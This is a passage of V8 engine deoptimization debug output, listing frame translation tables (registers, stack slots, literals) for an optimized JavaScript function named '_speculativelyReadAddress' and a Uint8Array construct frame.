                               REGISTER {input=rax}
                               LITERAL {literal_id=8 (0)}
                               REGISTER {input=rcx}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
    18              172    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=172, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=21 (bool)}
                               INT32_STACK_SLOT {input=22}
                               DOUBLE_STACK_SLOT {input=23}
                               REGISTER {input=rax}
                               LITERAL {literal_id=8 (0)}
                               REGISTER {input=rcx}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
    19              172    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=172, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=21 (bool)}
                               INT32_STACK_SLOT {input=22}
                               DOUBLE_STACK_SLOT {input=23}
                               REGISTER {input=rax}
                               LITERAL {literal_id=8 (0)}
                               REGISTER {input=rcx}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
    20              172    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=172, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=21 (bool)}
                               INT32_REGISTER {input=r11}
                               DOUBLE_STACK_SLOT {input=23}
                               REGISTER {input=rax}
                               LITERAL {literal_id=8 (0)}
                               REGISTER {input=rcx}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
    21              172    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=172, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=21 (bool)}
                               INT32_REGISTER {input=r11}
                               DOUBLE_STACK_SLOT {input=23}
                               REGISTER {input=rax}
                               LITERAL {literal_id=8 (0)}
                               REGISTER {input=rcx}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
    22              172    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=172, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=21 (bool)}
                               INT32_REGISTER {input=r11}
                               DOUBLE_STACK_SLOT {input=23}
                               REGISTER {input=rax}
                               LITERAL {literal_id=8 (0)}
                               REGISTER {input=rcx}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
    23              172    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=172, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=21 (bool)}
                               INT32_REGISTER {input=r11}
                               DOUBLE_STACK_SLOT {input=23}
                               REGISTER {input=rax}
                               LITERAL {literal_id=8 (0)}
                               REGISTER {input=rcx}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
    24              172    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=172, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=21 (bool)}
                               INT32_REGISTER {input=r11}
                               DOUBLE_STACK_SLOT {input=23}
                               REGISTER {input=rax}
                               LITERAL {literal_id=8 (0)}
                               REGISTER {input=rcx}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
    25              172    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=172, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=21 (bool)}
                               INT32_REGISTER {input=r11}
                               DOUBLE_STACK_SLOT {input=23}
                               REGISTER {input=rax}
                               LITERAL {literal_id=8 (0)}
                               REGISTER {input=rcx}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
    26              243    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=243, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rax}
                               LITERAL {literal_id=8 (0)}
                               REGISTER {input=rcx}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
    27              243    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=243, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rax}
                               LITERAL {literal_id=8 (0)}
                               REGISTER {input=rcx}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
    28              243    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=243, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rax}
                               LITERAL {literal_id=8 (0)}
                               REGISTER {input=rcx}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
    29               50    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=50, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               INT32_STACK_SLOT {input=21}
                               REGISTER {input=rcx}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
    30               50    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=50, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=r8}
                               REGISTER {input=rcx}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
    31               50    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=50, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=r8}
                               REGISTER {input=rcx}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
    32               50    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=50, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=r8}
                               REGISTER {input=rcx}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
    33               50    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=50, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=r8}
                               REGISTER {input=rcx}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=19}
    34              132    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=132, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               BOOL_REGISTER {input=rdx (bool)}
                               INT32_REGISTER {input=r12}
                               DOUBLE_REGISTER {input=xmm0}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=r8}
                               REGISTER {input=rcx}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
    35              132    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=132, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               BOOL_REGISTER {input=rdx (bool)}
                               INT32_REGISTER {input=r12}
                               DOUBLE_REGISTER {input=xmm0}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=r8}
                               REGISTER {input=rcx}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
    36              132    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=132, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               BOOL_REGISTER {input=rdx (bool)}
                               INT32_REGISTER {input=r12}
                               DOUBLE_REGISTER {input=xmm0}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=r8}
                               REGISTER {input=rcx}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
    37              132    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=132, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               BOOL_REGISTER {input=rdx (bool)}
                               INT32_REGISTER {input=r12}
                               DOUBLE_REGISTER {input=xmm0}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=r8}
                               REGISTER {input=rcx}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
    38              689   70a  BEGIN {frame count=3, js frame count=2, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=161, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=22 (bool)}
                               INT32_STACK_SLOT {input=24}
                               DOUBLE_STACK_SLOT {input=25}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               INT32_STACK_SLOT {input=21}
                               STACK_SLOT {input=20}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               CONSTRUCT_STUB_FRAME {bailout_id=2, function=0x3f3b16e05449 <String[10]: Uint8Array>, height=2}
                               LITERAL {literal_id=4 (0x2aec586127e9 <JSFunction Uint8Array (sfi = 0x247b86a94b01)>)}
                               INT32_STACK_SLOT {input=19}
                               LITERAL {literal_id=4 (0x2aec586127e9 <JSFunction Uint8Array (sfi = 0x247b86a94b01)>)}
                               JAVA_SCRIPT_BUILTIN_CONTINUATION_FRAME {bailout_id=689, function=0x3f3b16e05449 <String[10]: Uint8Array>, height=4}
                               LITERAL {literal_id=4 (0x2aec586127e9 <JSFunction Uint8Array (sfi = 0x247b86a94b01)>)}
                               LITERAL {literal_id=5 (0x3f3b16e02691 <the_hole>)}
                               LITERAL {literal_id=4 (0x2aec586127e9 <JSFunction Uint8Array (sfi = 0x247b86a94b01)>)}
                               LITERAL {literal_id=6 (0x3f3b16e025b1 <undefined>)}
                               LITERAL {literal_id=7 (1)}
                               STACK_SLOT {input=17}
    39              172    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=172, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=22 (bool)}
                               INT32_STACK_SLOT {input=24}
                               DOUBLE_STACK_SLOT {input=25}
                               REGISTER {input=rax}
                               INT32_STACK_SLOT {input=21}
                               STACK_SLOT {input=20}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rcx}
    40              172    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=172, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=22 (bool)}
                               INT32_STACK_SLOT {input=24}
                               DOUBLE_STACK_SLOT {input=25}
                               REGISTER {input=rax}
                               INT32_STACK_SLOT {input=21}
                               STACK_SLOT {input=20}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rcx}
    41              172    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=172, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=22 (bool)}
                               INT32_STACK_SLOT {input=24}
                               DOUBLE_STACK_SLOT {input=25}
                               REGISTER {input=rax}
                               INT32_STACK_SLOT {input=21}
                               REGISTER {input=rsi}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rcx}
    42              172    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=172, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=22 (bool)}
                               INT32_STACK_SLOT {input=24}
                               DOUBLE_STACK_SLOT {input=25}
                               REGISTER {input=rax}
                               INT32_STACK_SLOT {input=21}
                               REGISTER {input=rsi}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rcx}
    43              172    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=172, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=22 (bool)}
                               INT32_STACK_SLOT {input=24}
                               DOUBLE_STACK_SLOT {input=25}
                               REGISTER {input=rax}
                               INT32_STACK_SLOT {input=21}
                               REGISTER {input=rsi}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rcx}
    44              172    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=172, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=22 (bool)}
                               INT32_STACK_SLOT {input=24}
                               DOUBLE_STACK_SLOT {input=25}
                               REGISTER {input=rax}
                               INT32_STACK_SLOT {input=21}
                               REGISTER {input=rsi}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rcx}
    45              172    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=172, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=22 (bool)}
                               INT32_REGISTER {input=r11}
                               DOUBLE_STACK_SLOT {input=25}
                               REGISTER {input=rax}
